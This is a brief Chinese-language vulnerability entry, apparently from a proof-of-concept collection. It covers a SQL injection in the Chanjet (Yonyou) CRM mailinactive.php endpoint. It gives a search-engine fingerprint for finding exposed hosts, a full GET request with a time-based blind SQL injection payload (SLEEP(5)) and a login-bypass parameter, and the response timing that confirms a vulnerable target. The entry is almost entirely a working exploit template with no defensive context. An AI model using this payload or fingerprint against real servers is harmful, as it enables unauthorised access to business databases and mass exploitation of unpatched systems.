# 畅捷通CRMmailinactive.php存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-1068428644"`
- **请求**：`GET /mail/mailinactive.php?name=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--+-&DontCheckLogin=1 HTTP/1.1`
- **响应特征**：200 响应时间>=5s